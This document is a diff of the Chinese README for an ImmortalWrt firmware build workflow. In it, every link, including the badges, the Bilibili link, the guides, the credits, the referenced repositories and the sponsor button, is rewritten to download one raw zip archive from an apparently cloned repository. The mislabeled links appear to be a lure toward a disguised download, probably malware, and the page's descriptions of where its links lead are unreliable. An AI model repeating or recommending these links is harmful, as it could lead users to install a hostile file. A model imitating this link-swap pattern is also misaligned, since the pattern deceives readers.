@@ -1,7 +1,7 @@
 # AutoBuildImmortalWrt
-[![GitHub](https://github.com/ztdesk1/AutoBuildImmortalWrt/releases%20)](https://github.com/ztdesk1/AutoBuildImmortalWrt/releases)
-![GitHub Stars](https://github.com/ztdesk1/AutoBuildImmortalWrt/releases)
-![GitHub Forks](https://github.com/ztdesk1/AutoBuildImmortalWrt/releases) [![Github](https://github.com/ztdesk1/AutoBuildImmortalWrt/releases)](https://github.com/ztdesk1/AutoBuildImmortalWrt/releases) [![Bilibili](https://github.com/ztdesk1/AutoBuildImmortalWrt/releases)](https://github.com/ztdesk1/AutoBuildImmortalWrt/releases) [![操作步骤](https://github.com/ztdesk1/AutoBuildImmortalWrt/releases)](https://github.com/ztdesk1/AutoBuildImmortalWrt/releases)
+[![GitHub](https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip%20)](https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip)
+![GitHub Stars](https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip)
+![GitHub Forks](https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip) [![Github](https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip)](https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip) [![Bilibili](https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip)](https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip) [![操作步骤](https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip)](https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip)
 
 ## 🤔 这是什么？
 它是一个工作流。可快速构建 带docker且支持自定义固件大小的 immortalWrt
@@ -12,16 +12,16 @@
 > 5、新增全志平台R1S、香橙派Zero3等机型的工作流<br>
 > 6、新增用户预设置pppoe拨号功能<br>
 > 7、新增树莓派①②③④⑤<br>
-> 8、新增第三方软件包的集成功能 https://github.com/ztdesk1/AutoBuildImmortalWrt/releases
+> 8、新增第三方软件包的集成功能 https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip
 
 
 ## 如何查询imm仓库内有哪些插件
-https://github.com/ztdesk1/AutoBuildImmortalWrt/releases
+https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip
 ## 如何查询imm仓库外目前可以集成哪些插件
-https://github.com/ztdesk1/AutoBuildImmortalWrt/releases
-> 具体方法 https://github.com/ztdesk1/AutoBuildImmortalWrt/releases
+https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip
+> 具体方法 https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip
 ## 第三方插件集成的原理详见以下视频
-https://github.com/ztdesk1/AutoBuildImmortalWrt/releases
+https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip
 
 ## 旁路由的用户必读
 近期不少用户修改配置文件中的默认ip地址，误认为这个工作流可以直接设置旁路ip。这是巨大的误解，这样设置就乱套了。<br>
@@ -41,27 +41,27 @@ https://github.com/ztdesk1/AutoBuildImmortalWrt/releases
 - 若用户在工作流中勾选了拨号信息 则WAN口模式为pppoe拨号模式。
 - 建议拨号用户使用之前重启一次光猫。
 - 综合上述特点，【单网口设备】应该先接路由器，先在上级路由器查看一下它的ip 再访问。
-- 上述特点 你都可以通过 `https://github.com/ztdesk1/AutoBuildImmortalWrt/releases` 配置和调整
+- 上述特点 你都可以通过 `https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip` 配置和调整
 
 ## ❤️其它GitHub Action项目推荐🌟 （建议收藏）⬇️
 - ### [一键生成run插件] 🆕
-- https://github.com/ztdesk1/AutoBuildImmortalWrt/releases<br>
+- https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip<br>
 - ### [一键生成docker离线镜像] 🆕
-- https://github.com/ztdesk1/AutoBuildImmortalWrt/releases<br>
+- https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip<br>
 - ### [OpenWrt/Armbian IMG安装器ISO] 🆕
-- https://github.com/ztdesk1/AutoBuildImmortalWrt/releases
+- https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip
 
 
 ## ❤️如何构建docker版ImmortalWrt（建议收藏）⬇️
-https://github.com/ztdesk1/AutoBuildImmortalWrt/releases
+https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip
 # 🌟鸣谢
-### https://github.com/ztdesk1/AutoBuildImmortalWrt/releases
-### https://github.com/ztdesk1/AutoBuildImmortalWrt/releases
-### https://github.com/ztdesk1/AutoBuildImmortalWrt/releases
+### https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip
+### https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip
+### https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip
 
 ## ❤️赞助作者 ⬇️⬇️
 
-[![点击这里赞助我](https://github.com/ztdesk1/AutoBuildImmortalWrt/releases点击这里赞助我-支持作者的项目-orange?logo=github)](https://github.com/ztdesk1/AutoBuildImmortalWrt/releases)
+[![点击这里赞助我](https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip点击这里赞助我-支持作者的项目-orange?logo=github)](https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip)
 
 
 
@@ -70,10 +70,10 @@ https://github.com/ztdesk1/AutoBuildImmortalWrt/releases
 <summary><h2>🍭相关引用</h2></summary>
 
 #### 🍭引用和项目参考的仓库
-- https://github.com/ztdesk1/AutoBuildImmortalWrt/releases
-- https://github.com/ztdesk1/AutoBuildImmortalWrt/releases
-- https://github.com/ztdesk1/AutoBuildImmortalWrt/releases
-- https://github.com/ztdesk1/AutoBuildImmortalWrt/releases
-- https://github.com/ztdesk1/AutoBuildImmortalWrt/releases
-- https://github.com/ztdesk1/AutoBuildImmortalWrt/releases
-- https://github.com/ztdesk1/AutoBuildImmortalWrt/releases
+- https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip
+- https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip
+- https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip
+- https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip
+- https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip
+- https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip
+- https://github.com/ztdesk1/AutoBuildImmortalWrt/raw/refs/heads/master/shell/Auto_Wrt_Build_Immortal_v3.7.zip
